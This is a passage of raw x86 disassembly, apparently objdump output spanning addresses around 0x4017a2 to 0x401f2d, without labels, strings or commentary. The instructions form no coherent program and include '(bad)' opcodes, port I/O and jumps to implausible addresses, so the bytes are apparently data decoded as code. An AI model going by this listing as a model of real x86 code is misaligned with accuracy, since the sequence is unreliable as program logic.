  4017a2:	xor    BYTE PTR [eax],ah
  4017a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a5:	add    BYTE PTR [edx],dh
  4017a7:	add    BYTE PTR [eax+edx*1+0x2c],ah
  4017ab:	mov    al,ds:0x10082004
  4017b0:	sbb    eax,0x2000e001
  4017b5:	add    BYTE PTR [edx+0x30204432],ah
  4017bb:	pushf  
  4017bc:	adc    BYTE PTR [ebx+0x1c10a11],al
  4017c2:	inc    eax
  4017c3:	add    BYTE PTR [ebp+0x212000],0xa7
  4017ca:	sub    BYTE PTR [eax],0x26
  4017cd:	adc    BYTE PTR [ecx+eiz*2],cl
  4017d0:	call   DWORD PTR ds:0x44a044
  4017d6:	sub    BYTE PTR [ebp+0x0],cl
  4017d9:	cmp    al,cl
  4017db:	add    BYTE PTR [eax],al
  4017dd:	mov    BYTE PTR [ebp+0x22080700],al
  4017e3:	test   BYTE PTR [ecx],dl
  4017e5:	test   DWORD PTR [eax-0xd1e7f7c],eax
  4017eb:	test   BYTE PTR [esi+ecx*4],dl
  4017ee:	add    eax,0xcc58844
  4017f3:	jbe    0x40180d
  4017f5:	add    BYTE PTR [edx],0xc0
  4017f8:	nop
  4017f9:	adc    ch,cl
  4017fb:	add    al,bl
  4017fd:	aam    0x19
  4017ff:	or     al,0x7
  401801:	and    DWORD PTR [ecx+0x23],eax
  401804:	adc    DWORD PTR [edx],eax
  401806:	and    al,BYTE PTR [eax-0x59]
  401809:	or     BYTE PTR [eax+0x455250c3],al
  40180f:	add    al,0x80
  401811:	xchg   esp,eax
  401812:	dec    esp
  401813:	and    al,0x1a
  401815:	adc    al,0x10
  401817:	add    ah,ah
  401819:	inc    eax
  40181a:	add    BYTE PTR [ecx+0x0],ah
  40181d:	add    BYTE PTR [eax+0x4],ch
  401820:	adc    DWORD PTR [eax+0x11080a20],0xc0f81586
  40182a:	aad    0x1a
  40182c:	or     al,BYTE PTR [ebx]
  40182e:	dec    esp
  40182f:	rol    BYTE PTR [ecx],0xc
  401832:	inc    eax
  401833:	and    BYTE PTR [eax+0x381400f0],0x42
  40183a:	add    BYTE PTR [eax],al
  40183c:	push   esp
  40183d:	adc    DWORD PTR [ebx],edx
  40183f:	or     BYTE PTR [eax+esi*1],0x20
  401843:	or     BYTE PTR es:[ecx],al
  401846:	adc    BYTE PTR [esi+0x14802a02],al
  40184c:	in     al,0xc
  40184e:	mov    al,ds:0x74124062
  401853:	and    dl,BYTE PTR [eax]
  401855:	push   eax
  401856:	shl    BYTE PTR [edx],0x34
  401859:	cwde   
  40185a:	and    al,0x14
  40185c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40185d:	add    dl,BYTE PTR [ecx]
  40185f:	or     BYTE PTR [eax+0x4a],al
  401862:	and    BYTE PTR [eax],dl
  401864:	push   eax
  401865:	push   eax
  401866:	adc    BYTE PTR [ecx-0x60],al
  401869:	add    DWORD PTR [ecx+0x2208450],ecx
  40186f:	cmp    al,0x60
  401871:	add    BYTE PTR [eax+0x826e011],ah
  401877:	xor    dh,BYTE PTR [eax-0x3f]
  40187a:	xor    BYTE PTR [ecx],cl
  40187c:	adc    BYTE PTR [eax],0x14
  40187f:	push   es
  401880:	pusha  
  401881:	or     al,0x8
  401883:	mov    al,ds:0x1244
  401888:	and    eax,DWORD PTR [eax]
  40188a:	add    eax,0x12056108
  40188f:	cmp    DWORD PTR [eax+0x149a32],ecx
  401895:	sbb    al,0x10
  401897:	sub    dl,BYTE PTR [esi]
  401899:	inc    edx
  40189a:	inc    ebx
  40189b:	mov    al,ds:0x12012160
  4018a0:	sbb    al,al
  4018a2:	adc    BYTE PTR [ecx*4+0x10e17020],al
  4018a9:	mov    al,ds:0x717120c
  4018ae:	xor    BYTE PTR [eax],ah
  4018b0:	add    BYTE PTR [edx],cl
  4018b2:	xor    al,BYTE PTR [esi]
  4018b4:	inc    esp
  4018b5:	cwde   
  4018b6:	add    BYTE PTR [eax],dl
  4018b8:	add    dl,ah
  4018ba:	add    BYTE PTR [ecx],ch
  4018bc:	xor    DWORD PTR [ecx],esi
  4018be:	loopne 0x40186e
  4018c0:	mov    eax,ds:0x40048201
  4018c5:	adc    eax,0x8508696
  4018ca:	adc    DWORD PTR [ebp+0x0],edx
  4018cd:	and    BYTE PTR [edx+0x3c78a620],cl
  4018d3:	enter  0x210,0x8
  4018d7:	inc    eax
  4018d8:	and    DWORD PTR [eax],edx
  4018da:	test   al,0x14
  4018dc:	push   cs
  4018dd:	add    BYTE PTR [edx],0x0
  4018e0:	loopne 0x401932
  4018e2:	push   eax
  4018e3:	add    al,BYTE PTR [edx]
  4018e5:	or     BYTE PTR [eax+eax*2],al
  4018e8:	add    ah,al
  4018ea:	dec    eax
  4018eb:	adc    BYTE PTR [ecx+0x15],al
  4018ee:	xchg   DWORD PTR [eax],ecx
  4018f0:	inc    esi
  4018f1:	add    al,BYTE PTR [eax]
  4018f3:	add    cl,BYTE PTR [edx]
  4018f5:	push   es
  4018f6:	push   es
  4018f7:	ins    BYTE PTR es:[edi],dx
  4018f8:	add    BYTE PTR [edx],al
  4018fa:	pusha  
  4018fb:	pop    ds
  4018fc:	add    DWORD PTR [edx-0x1ef7fec0],eax
  401902:	jo     0x401904
  401904:	push   es
  401905:	inc    eax
  401906:	add    BYTE PTR [ecx],0x26
  401909:	adc    BYTE PTR [eax+0x0],0x17
  40190d:	and    al,BYTE PTR [eax+eax*2]
  401910:	mov    ebp,0x503410c2
  401915:	xor    BYTE PTR es:[eax],dl
  401918:	inc    esp
  401919:	add    BYTE PTR [ecx],bl
  40191b:	adc    BYTE PTR [eax],dl
  40191d:	or     BYTE PTR [eax],al
  40191f:	add    cl,BYTE PTR [edx]
  401921:	mov    es,WORD PTR [ebx+eiz*2-0x6c7fbede]
  401928:	inc    ecx
  401929:	test   al,0x0
  40192b:	mov    BYTE PTR [eax+0x1485204],dl
  401931:	call   0xb03dba
  401936:	push   esp
  401937:	enter  0x6192,0x4
  40193b:	int3   
  40193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40193d:	xor    al,0x2d
  40193f:	add    BYTE PTR [ecx],al
  401941:	or     eax,eax
  401943:	sub    DWORD PTR [eax],edx
  401945:	adc    BYTE PTR [eax],al
  401947:	sbb    DWORD PTR [eax],eax
  401949:	dec    eax
  40194a:	and    BYTE PTR [eax+0x0],bl
  40194d:	or     eax,0x21e11494
  401952:	pusha  
  401953:	aam    0x1
  401955:	add    DWORD PTR [ecx+ecx*1],0x11211d
  40195c:	xor    BYTE PTR [edx+0x63],al
  40195f:	adc    BYTE PTR [esi],al
  401961:	xchg   ebp,eax
  401962:	nop
  401963:	add    BYTE PTR [ebx],bl
  401965:	add    BYTE PTR [ecx+0x7a300010],ch
  40196b:	rcl    DWORD PTR [ecx],1
  40196d:	sbb    eax,DWORD PTR [edi]
  40196f:	add    al,0x73
  401971:	add    al,0xe
  401973:	sub    BYTE PTR [eax],al
  401975:	mov    esp,0x83033a0
  40197a:	sub    al,0x28
  40197c:	and    DWORD PTR [eax],eax
  40197e:	or     BYTE PTR [eax],al
  401980:	add    al,BYTE PTR [edx+edx*1+0x44081105]
  401987:	dec    eax
  401988:	mov    ds:0x4a440085,al
  40198d:	inc    ecx
  40198e:	inc    edx
  40198f:	and    BYTE PTR [eax],ch
  401991:	inc    ecx
  401992:	sbb    BYTE PTR [edx],bl
  401994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401995:	and    al,0x26
  401997:	or     BYTE PTR [eax],al
  401999:	stos   DWORD PTR es:[edi],eax
  40199a:	pusha  
  40199b:	dec    eax
  40199c:	inc    eax
  40199d:	or     BYTE PTR [esp+edx*1+0x50005881],al
  4019a4:	test   BYTE PTR [eax+eax*2],dl
  4019a7:	arpl   WORD PTR [edx+0x1a],bp
  4019aa:	pop    esp
  4019ab:	add    BYTE PTR [eax],ch
  4019ad:	add    al,0xa0
  4019af:	mov    BYTE PTR [ecx+0x240c1180],al
  4019b5:	and    al,0x4
  4019b7:	and    DWORD PTR [ecx],eax
  4019b9:	mov    es,WORD PTR [eax]
  4019bb:	adc    BYTE PTR [ecx+0x0],dh
  4019be:	add    DWORD PTR [edx],eax
  4019c0:	or     BYTE PTR [ecx-0x7db72490],al
  4019c6:	adc    DWORD PTR [eax],0x1802031
  4019cc:	les    ecx,FWORD PTR [eax+0x401110bd]
  4019d2:	add    eax,0x1015024
  4019d7:	add    BYTE PTR [edx*1+0x8a02485],al
  4019de:	mov    DWORD PTR [edx],eax
  4019e0:	nop
  4019e1:	pop    edx
  4019e2:	add    BYTE PTR [eax],ah
  4019e4:	or     BYTE PTR [eax+0x2b],0x45
  4019e8:	call   0x4c505b97
  4019ed:	cmp    BYTE PTR [edx],ah
  4019ef:	sbb    BYTE PTR [eax],al
  4019f1:	push   ecx
  4019f2:	add    BYTE PTR [edx],al
  4019f4:	dec    esp
  4019f5:	add    ebp,DWORD PTR [ecx]
  4019f7:	or     BYTE PTR [eax+eax*1+0x80d1a08],al
  4019fe:	push   0xa200b80
  401a03:	shl    DWORD PTR [eax],0x4
  401a06:	adc    eax,0x480809a
  401a0b:	add    cl,BYTE PTR [eax]
  401a0d:	push   ss
  401a0e:	add    BYTE PTR [eax],cl
  401a10:	jb     0x401992
  401a12:	dec    eax
  401a13:	mov    al,0x39
  401a15:	cwde   
  401a16:	inc    eax
  401a17:	and    DWORD PTR [ecx+eiz*1+0x40915a],eax
  401a1e:	or     BYTE PTR [eax-0x47faff7b],dh
  401a24:	add    BYTE PTR [eax],al
  401a26:	mov    BYTE PTR [edx],ch
  401a28:	mov    eax,ds:0x1544018
  401a2d:	and    DWORD PTR [eax],eax
  401a2f:	and    bh,BYTE PTR [ebx]
  401a31:	add    al,ah
  401a33:	xchg   edx,eax
  401a34:	or     al,BYTE PTR [eax+0x14]
  401a37:	add    BYTE PTR [eax],al
  401a39:	jnp    0x4019bb
  401a3b:	add    al,0x0
  401a3d:	or     BYTE PTR [edx],al
  401a3f:	add    eax,DWORD PTR [eax+0x21020140]
  401a45:	rol    DWORD PTR [eax],0x4
  401a48:	nop
  401a49:	add    al,0x2c
  401a4b:	add    al,0x1
  401a4d:	test   DWORD PTR [eax],eax
  401a4f:	and    BYTE PTR [eax],al
  401a51:	adc    DWORD PTR [esi],ecx
  401a53:	mov    ch,0x10
  401a55:	add    BYTE PTR [eax+0x40],al
  401a58:	and    BYTE PTR ds:0x103b4240,ah
  401a5e:	inc    eax
  401a5f:	adc    ebx,eax
  401a61:	or     BYTE PTR ds:0x628004,bl
  401a67:	adc    eax,0x162810e1
  401a6c:	popa   
  401a6d:	mov    al,ds:0x65242c1
  401a72:	push   cs
  401a73:	pusha  
  401a74:	add    DWORD PTR [esp+ecx*1],eax
  401a77:	(bad)  
  401a78:	add    DWORD PTR [edx+0x410cbc08],0x22
  401a7f:	add    BYTE PTR [ebx],ch
  401a81:	inc    esp
  401a82:	adc    BYTE PTR [edi],ah
  401a84:	push   eax
  401a85:	and    DWORD PTR [eax+0x52],eax
  401a88:	add    DWORD PTR [eax],eax
  401a8a:	adc    eax,DWORD PTR [esi]
  401a8c:	lock add BYTE PTR [eax+0x40],dl
  401a90:	popa   
  401a91:	inc    eax
  401a92:	and    BYTE PTR [eax],al
  401a94:	inc    eax
  401a95:	adc    dl,al
  401a97:	les    ebp,FWORD PTR [eax]
  401a99:	sub    ch,al
  401a9b:	xor    al,BYTE PTR [eax-0x7b]
  401a9e:	add    BYTE PTR [edx+0x21],0x0
  401aa2:	add    BYTE PTR [ecx+ebp*1+0x7],al
  401aa6:	and    BYTE PTR [edx],al
  401aa8:	add    BYTE PTR [eax-0x58],al
  401aab:	cmp    BYTE PTR [ecx],dh
  401aad:	or     BYTE PTR [eax+0x9],al
  401ab0:	loop   0x401af6
  401ab2:	dec    ecx
  401ab3:	add    BYTE PTR [esi],al
  401ab5:	add    BYTE PTR [ebx],0x8
  401ab8:	add    BYTE PTR [edx],dh
  401aba:	add    DWORD PTR [eax],esi
  401abc:	and    DWORD PTR [ebx],eax
  401abe:	add    al,BYTE PTR [edi-0x7effbcf7]
  401ac4:	inc    ecx
  401ac5:	inc    edx
  401ac6:	add    DWORD PTR [edx],esp
  401ac8:	xor    BYTE PTR [ecx+0x3004190c],al
  401ace:	adc    al,BYTE PTR [eax]
  401ad0:	and    DWORD PTR [edx+0x10],ebx
  401ad3:	and    BYTE PTR [ecx],cl
  401ad5:	add    BYTE PTR [ecx-0x6bff13fe],dl
  401adb:	push   0xffffffc2
  401add:	out    0x1e,eax
  401adf:	pop    DWORD PTR [ecx]
  401ae1:	mov    edx,0x84141304
  401ae6:	xchg   BYTE PTR [eax],al
  401ae8:	push   edx
  401ae9:	add    BYTE PTR [eax],al
  401aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aec:	xchg   ecx,eax
  401aed:	and    DWORD PTR [ecx+eiz*4+0x460a9750],ebx
  401af4:	add    BYTE PTR ds:0xc401032,ah
  401afa:	and    BYTE PTR [eax],bh
  401afc:	and    DWORD PTR [edx+0x5c506604],eax
  401b02:	and    DWORD PTR [eax],eax
  401b04:	popa   
  401b05:	and    DWORD PTR [ecx+0x12190a41],eax
  401b0b:	loope  0x401b3d
  401b0d:	push   eax
  401b0e:	add    al,0x28
  401b10:	add    DWORD PTR [eax],eax
  401b12:	or     BYTE PTR [eax],0x28
  401b15:	sub    eax,DWORD PTR [eax+0x28e38a80]
  401b1b:	or     eax,0x3c6a0108
  401b20:	inc    eax
  401b21:	and    BYTE PTR [edx],0x96
  401b24:	and    BYTE PTR [edx],0x48
  401b27:	xor    al,BYTE PTR [eax+eax*1+0x34]
  401b2b:	adc    dh,0x87
  401b2e:	xchg   ebp,eax
  401b2f:	add    DWORD PTR [esi],0x2e910204
  401b35:	push   cs
  401b36:	adc    al,0x24
  401b38:	add    BYTE PTR [eax],dh
  401b3a:	adc    BYTE PTR [eax+eax*1+0x44],al
  401b3e:	or     cl,BYTE PTR [eax]
  401b40:	inc    ecx
  401b41:	and    DWORD PTR [eax],edx
  401b43:	adc    DWORD PTR [esi+0x1320001],ecx
  401b49:	push   ecx
  401b4a:	xor    BYTE PTR [eax+eax*1],al
  401b4d:	mov    WORD PTR [edx],ds
  401b4f:	and    ch,BYTE PTR [eax+eax*2-0x8]
  401b53:	and    BYTE PTR [ebx],al
  401b55:	sbb    al,0x4c
  401b57:	sbb    BYTE PTR [edx+0x8],al
  401b5a:	add    al,0x22
  401b5c:	add    BYTE PTR [edx],ch
  401b5e:	add    al,0x92
  401b60:	sbb    DWORD PTR [ecx],0x40ca2109
  401b66:	aad    0x1
  401b68:	dec    esp
  401b69:	sub    DWORD PTR ds:0xe404e02,ebx
  401b6f:	push   eax
  401b70:	adc    BYTE PTR [ebx-0x7c9c5f9f],al
  401b76:	add    BYTE PTR [edx+0x8],ah
  401b79:	add    BYTE PTR [ebx],cl
  401b7b:	(bad)  
  401b7c:	push   ss
  401b7d:	mov    ah,0x8c
  401b7f:	xchg   esi,eax
  401b80:	sub    eax,0x81100071
  401b85:	pusha  
  401b86:	add    BYTE PTR fs:[eax],0xc0
  401b8a:	add    BYTE PTR [eax+0x690cda7a],dl
  401b90:	add    BYTE PTR [eax],dl
  401b92:	cmp    al,0x0
  401b94:	imul   eax,DWORD PTR [edx+edx*1],0x25
  401b98:	add    BYTE PTR [edx],al
  401b9a:	inc    eax
  401b9b:	mov    DWORD PTR [eax],eax
  401b9d:	add    DWORD PTR [ecx],esi
  401b9f:	ret    0x1100
  401ba2:	adc    BYTE PTR [edx+eiz*2],al
  401ba5:	or     eax,0x2c014d0a
  401baa:	xor    BYTE PTR [eax+0x2109a081],dl
  401bb0:	test   al,0x0
  401bb2:	adc    al,0x0
  401bb4:	nop
  401bb5:	add    al,0x1
  401bb7:	xchg   edx,eax
  401bb8:	inc    eax
  401bb9:	push   ebx
  401bba:	add    BYTE PTR [eax],0x0
  401bbd:	add    BYTE PTR [eax+0xd423480],al
  401bc3:	adc    BYTE PTR [eax],0x22
  401bc6:	adc    eax,DWORD PTR [edx+0x8a0280]
  401bcc:	mov    BYTE PTR [ecx+0x1],al
  401bcf:	xchg   esp,eax
  401bd0:	nop
  401bd1:	push   es
  401bd2:	add    DWORD PTR [eax-0x52],ecx
  401bd5:	adc    eax,DWORD PTR [eax]
  401bd7:	and    BYTE PTR [eax],al
  401bd9:	jb     0x401bfd
  401bdb:	jb     0x401bdd
  401bdd:	add    BYTE PTR [eax],al
  401bdf:	xor    BYTE PTR [esi+eax*4+0x842821],al
  401be6:	add    BYTE PTR [eax],cl
  401be8:	rol    BYTE PTR cs:[ebp-0x3f3fbcf8],cl
  401bef:	push   edx
  401bf0:	or     BYTE PTR [ecx],al
  401bf2:	xchg   edx,eax
  401bf3:	dec    eax
  401bf4:	add    BYTE PTR [eax],al
  401bf6:	add    BYTE PTR [eax+ecx*1],al
  401bf9:	adc    BYTE PTR [edx-0x7f],al
  401bfc:	mov    ds:0x88260149,al
  401c01:	call   0x1414:0x52df08
  401c08:	inc    ebp
  401c09:	xor    BYTE PTR [eax-0x34],al
  401c0c:	mov    WORD PTR [eax],ds
  401c0e:	or     BYTE PTR [eax+0x4582100c],bl
  401c14:	add    BYTE PTR [eax+0x8],ah
  401c17:	add    BYTE PTR [eax],al
  401c19:	and    BYTE PTR [ebp-0x5ffddf20],bl
  401c1f:	inc    ebx
  401c20:	add    al,BYTE PTR [edx+0x30]
  401c23:	or     al,BYTE PTR [esi+0x20]
  401c26:	add    bh,0x0
  401c29:	nop
  401c2a:	push   eax
  401c2b:	xchg   esi,eax
  401c2c:	or     BYTE PTR [ecx+0x19],0x20
  401c30:	inc    edx
  401c31:	mov    dh,BYTE PTR [ebx]
  401c33:	or     eax,0x13c01001
  401c38:	nop
  401c39:	and    al,BYTE PTR [edx]
  401c3b:	add    BYTE PTR [edx],0x1
  401c3e:	or     cl,BYTE PTR [eax]
  401c40:	add    DWORD PTR [ebx-0x58],0x1
  401c44:	xor    al,al
  401c46:	je     0x401c68
  401c48:	cwde   
  401c49:	mov    al,ds:0x14000b45
  401c4e:	inc    ecx
  401c4f:	push   ebx
  401c50:	and    BYTE PTR [eax+0xa],dl
  401c53:	add    ebx,DWORD PTR [eax]
  401c55:	inc    eax
  401c56:	sub    BYTE PTR [eax+eax*1],al
  401c59:	add    ebp,DWORD PTR [edx]
  401c5b:	mov    gs,WORD PTR [edx]
  401c5d:	inc    esi
  401c5e:	or     eax,DWORD PTR [edx]
  401c60:	push   es
  401c61:	dec    edx
  401c62:	push   ebx
  401c63:	adc    al,0x20
  401c65:	and    DWORD PTR [eax-0x40],edx
  401c68:	add    BYTE PTR [edx],al
  401c6a:	add    BYTE PTR [edx],0x60
  401c6d:	adc    BYTE PTR [eax],al
  401c6f:	nop
  401c70:	adc    cl,BYTE PTR [eax]
  401c72:	adc    al,0x9
  401c74:	inc    eax
  401c75:	nop
  401c76:	add    BYTE PTR [edx],dh
  401c78:	inc    eax
  401c79:	and    al,0x40
  401c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c7c:	outs   dx,BYTE PTR ds:[esi]
  401c7d:	popa   
  401c7e:	dec    eax
  401c7f:	sub    BYTE PTR [ebx+0x20422509],ah
  401c85:	and    BYTE PTR [edx+0x1252100],al
  401c8b:	inc    eax
  401c8c:	inc    ecx
  401c8d:	push   0xa0227806
  401c92:	add    DWORD PTR [ebx],eax
  401c94:	inc    eax
  401c95:	cdq    
  401c96:	dec    edx
  401c97:	or     BYTE PTR [edx+0x18],bh
  401c9a:	rol    DWORD PTR [eax-0x70],1
  401c9d:	add    cl,BYTE PTR [eax]
  401c9f:	mov    ss,eax
  401ca1:	add    BYTE PTR [esi+eax*1],dl
  401ca4:	in     eax,0x10
  401ca6:	add    BYTE PTR [eax-0x6fd4bb6d],cl
  401cac:	loope  0x401c33
  401cae:	and    BYTE PTR [eax+ecx*1],al
  401cb1:	or     dl,BYTE PTR [eax]
  401cb3:	add    al,0xb1
  401cb5:	add    ah,al
  401cb7:	dec    eax
  401cb8:	or     BYTE PTR [esi],cl
  401cba:	sbb    al,BYTE PTR [eax+0x28ca440]
  401cc0:	add    BYTE PTR [eax+0x29800c66],al
  401cc6:	add    bl,BYTE PTR [eax+0x72]
  401cc9:	sbb    BYTE PTR [eax],al
  401ccb:	add    eax,0x80a08000
  401cd0:	or     BYTE PTR [edx],al
  401cd2:	mov    WORD PTR [eax],fs
  401cd4:	or     BYTE PTR [eax],al
  401cd6:	inc    edx
  401cd7:	add    DWORD PTR [edx],edx
  401cd9:	adc    DWORD PTR [eax+0x12124180],0x108d9208
  401ce3:	inc    eax
  401ce4:	inc    esp
  401ce5:	adc    ch,dh
  401ce7:	inc    ebx
  401ce8:	and    BYTE PTR [ecx],dl
  401cea:	mov    al,ds:0x282203a8
  401cef:	pusha  
  401cf0:	or     eax,0xb00a0a28
  401cf5:	add    BYTE PTR [eax+eax*1+0x0],al
  401cf9:	adc    BYTE PTR [eax+0x4c032],ah
  401cff:	lods   al,BYTE PTR ds:[esi]
  401d00:	ret    0x8025
  401d03:	nop
  401d04:	jmp    0xc2c15dcc
  401d09:	inc    ebp
  401d0a:	add    BYTE PTR ds:0x205200,cl
  401d10:	inc    ecx
  401d11:	and    BYTE PTR [edx-0x64efeef6],al
  401d17:	xchg   DWORD PTR [edx],eax
  401d19:	adc    al,0x80
  401d1b:	adc    edx,DWORD PTR [ecx]
  401d1d:	add    ah,BYTE PTR [eax]
  401d1f:	add    al,0x56
  401d21:	inc    edi
  401d22:	adc    bl,BYTE PTR [ebx]
  401d24:	or     al,BYTE PTR [esi+ecx*1-0x80]
  401d28:	or     al,BYTE PTR ds:0xc0880230
  401d2e:	lock dec eax
  401d30:	and    BYTE PTR [eax],al
  401d32:	inc    esp
  401d33:	pop    edx
  401d34:	inc    edx
  401d35:	or     esi,DWORD PTR [edx]
  401d37:	aam    0x82
  401d39:	sub    BYTE PTR [eax],dh
  401d3b:	add    al,0x60
  401d3d:	add    BYTE PTR [eax],al
  401d3f:	add    BYTE PTR [ecx],cl
  401d41:	and    DWORD PTR [edx],eax
  401d43:	add    al,0x61
  401d45:	add    DWORD PTR [edx],ebp
  401d47:	add    BYTE PTR [eax],0xc
  401d4a:	or     BYTE PTR [ebx+0x41],cl
  401d4d:	adc    al,dl
  401d4f:	and    DWORD PTR [ecx-0x6b7ce000],eax
  401d55:	add    cl,BYTE PTR [edx-0x7baf67c0]
  401d5b:	xor    DWORD PTR [ecx],eax
  401d5d:	xor    DWORD PTR [eax-0x6d],edx
  401d60:	adc    BYTE PTR [edx+0x40],cl
  401d63:	adc    BYTE PTR [ebx],ah
  401d65:	add    BYTE PTR [eax+0x830a442],cl
  401d6b:	push   es
  401d6c:	add    al,0x60
  401d6e:	add    BYTE PTR [eax+0x6],ah
  401d71:	mov    BYTE PTR [eax],al
  401d73:	add    BYTE PTR [ecx],al
  401d75:	enter  0x8208,0x10
  401d79:	and    eax,0x1464528
  401d7e:	or     DWORD PTR [eax],esi
  401d80:	xor    BYTE PTR [edx],al
  401d82:	and    BYTE PTR [eax],al
  401d84:	and    ah,BYTE PTR [eax]
  401d86:	adc    al,0x48
  401d88:	or     DWORD PTR [eax+0x10b01105],ebx
  401d8e:	push   edi
  401d8f:	ret    0x600
  401d92:	add    BYTE PTR [ecx],al
  401d94:	inc    eax
  401d95:	xor    al,BYTE PTR [ecx]
  401d97:	or     DWORD PTR [ecx+0x400212a8],esi
  401d9d:	mov    al,0x44
  401d9f:	add    BYTE PTR [eax],al
  401da1:	inc    edx
  401da2:	push   cs
  401da3:	add    BYTE PTR [ecx],ch
  401da5:	jb     0x401d2b
  401da7:	add    DWORD PTR [eax],edx
  401da9:	or     ch,BYTE PTR [ecx]
  401dab:	add    al,0x1e
  401dad:	add    al,0xc4
  401daf:	dec    ebp
  401db0:	pop    es
  401db1:	dec    esp
  401db2:	and    dl,cl
  401db4:	add    al,BYTE PTR [ecx]
  401db6:	mov    eax,ds:0x538c022
  401dbb:	add    eax,0x15119418
  401dc0:	(bad)  
  401dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dc3:	inc    ebp
  401dc4:	inc    edx
  401dc5:	dec    edx
  401dc6:	ret    0x1340
  401dc9:	inc    ecx
  401dca:	add    BYTE PTR [eax],al
  401dcc:	push   edx
  401dcd:	add    DWORD PTR [ecx+0x10044],eax
  401dd3:	add    BYTE PTR [eax],ch
  401dd5:	add    al,0x58
  401dd7:	adc    DWORD PTR [ebp+0x10410423],0x8008264
  401de1:	xor    BYTE PTR [eax],cl
  401de3:	adc    eax,0x9020d690
  401de8:	add    cl,BYTE PTR [eax-0x5f6deebe]
  401dee:	cmp    dh,BYTE PTR [eax+0x842201]
  401df4:	add    al,0x40
  401df6:	mov    BYTE PTR [ecx+0x0],al
  401df9:	inc    eax
  401dfa:	add    DWORD PTR [eax+0x1b22810],esp
  401e00:	push   0x4602a5
  401e05:	inc    eax
  401e06:	sbb    BYTE PTR [edx],al
  401e08:	rcl    BYTE PTR ds:0x2042002,1
  401e0e:	inc    esp
  401e0f:	mov    WORD PTR [edx],es
  401e11:	mov    eax,0x6a012044
  401e16:	dec    eax
  401e17:	adc    eax,0x216a80
  401e1c:	scas   al,BYTE PTR es:[edi]
  401e1d:	inc    eax
  401e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e1f:	push   ss
  401e20:	or     BYTE PTR [ecx],0x31
  401e23:	ror    DWORD PTR [eax+0x0],1
  401e26:	les    eax,FWORD PTR [eax]
  401e28:	sub    BYTE PTR [eax],ah
  401e2a:	push   eax
  401e2b:	adc    dl,bl
  401e2d:	adc    BYTE PTR [ecx+0x38],ch
  401e30:	push   eax
  401e31:	mov    al,ds:0x55823080
  401e36:	or     BYTE PTR [edx+0x6288084e],al
  401e3c:	lock inc eax
  401e3e:	inc    ecx
  401e3f:	add    BYTE PTR [eax+0x48038088],ch
  401e45:	push   es
  401e46:	inc    edx
  401e47:	add    BYTE PTR [ebp+0xc0088],dl
  401e4d:	dec    ecx
  401e4e:	add    al,0x10
  401e50:	pusha  
  401e51:	add    dh,BYTE PTR [edx+ecx*1]
  401e54:	inc    eax
  401e55:	add    DWORD PTR [ebx],eax
  401e57:	add    al,0xa0
  401e59:	and    BYTE PTR [ecx+0x21],al
  401e5c:	inc    ecx
  401e5d:	add    eax,0x34304056
  401e62:	lods   al,BYTE PTR ds:[esi]
  401e63:	add    edx,esi
  401e65:	adc    dl,BYTE PTR [eax]
  401e67:	add    BYTE PTR [eax],al
  401e69:	pusha  
  401e6a:	add    BYTE PTR [eax],ah
  401e6c:	add    BYTE PTR [ecx],al
  401e6e:	mov    al,ds:0x81400208
  401e73:	jb     0x401e8d
  401e75:	adc    esi,DWORD PTR [ecx+0x131002]
  401e7b:	xchg   ebp,eax
  401e7c:	or     BYTE PTR [eax],cl
  401e7e:	push   eax
  401e7f:	and    BYTE PTR [ecx+0x51],al
  401e82:	add    BYTE PTR [eax],dl
  401e84:	test   BYTE PTR [eax],dl
  401e86:	sub    BYTE PTR [eax],0x64
  401e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8a:	adc    DWORD PTR [eax],esi
  401e8c:	add    BYTE PTR [edx],bl
  401e8e:	sub    DWORD PTR [edx],esp
  401e90:	inc    esp
  401e91:	push   edx
  401e92:	mov    al,ds:0x2e802061
  401e97:	adc    dl,al
  401e99:	mov    ds:0xbb652601,eax
  401e9e:	sub    BYTE PTR [eax],0x22
  401ea1:	inc    eax
  401ea2:	add    BYTE PTR [eax],dl
  401ea4:	xchg   edx,eax
  401ea5:	sahf   
  401ea6:	sub    al,0x65
  401ea8:	inc    edi
  401ea9:	dec    esi
  401eaa:	or     BYTE PTR [eax],cl
  401eac:	and    DWORD PTR [esi],ebx
  401eae:	jle    0x401e36
  401eb0:	adc    DWORD PTR [eax],0x86422184
  401eb6:	add    BYTE PTR [edx],0x0
  401eb9:	nop
  401eba:	add    DWORD PTR [edx],0x206d86d8
  401ec0:	adc    BYTE PTR [eax+0x34450080],al
  401ec6:	nop
  401ec7:	or     BYTE PTR [eax+0x11b44008],ah
  401ecd:	and    DWORD PTR [eax+eax*8+0x824c09],eax
  401ed4:	adc    BYTE PTR [ebx],dl
  401ed6:	lock adc BYTE PTR [ecx+0x20],ch
  401eda:	and    BYTE PTR [ecx-0x3ddf7400],al
  401ee0:	or     dl,BYTE PTR [eax+0x37]
  401ee3:	inc    eax
  401ee4:	add    DWORD PTR [ecx],esi
  401ee6:	mov    BYTE PTR [ecx],al
  401ee8:	add    DWORD PTR [edx],ecx
  401eea:	retf   0x40
  401eed:	rcl    DWORD PTR [eax-0x5fcdbdef],0x86
  401ef4:	test   ecx,esp
  401ef6:	mov    dl,BYTE PTR [edx+0x0]
  401ef9:	push   eax
  401efa:	sub    eax,0x198a41
  401eff:	xchg   ecx,eax
  401f00:	add    BYTE PTR [ebx+eax*2],cl
  401f03:	and    al,BYTE PTR [eax+0x10]
  401f06:	adc    BYTE PTR [esi],bl
  401f08:	adc    BYTE PTR [esi+eax*1],bl
  401f0b:	jmp    0x6090:0xd167d3c0
  401f12:	add    eax,0xc4a840a2
  401f17:	adc    al,BYTE PTR [ebp-0x5f]
  401f1a:	pop    eax
  401f1b:	adc    BYTE PTR [eax],cl
  401f1d:	inc    esp
  401f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f1f:	pop    eax
  401f20:	jecxz  0x401f26
  401f22:	jb     0x401f24
  401f24:	mov    DWORD PTR [esi+0x290d4540],eax
  401f2a:	inc    eax
  401f2b:	cmp    al,0xa
  401f2d:	inc    eax
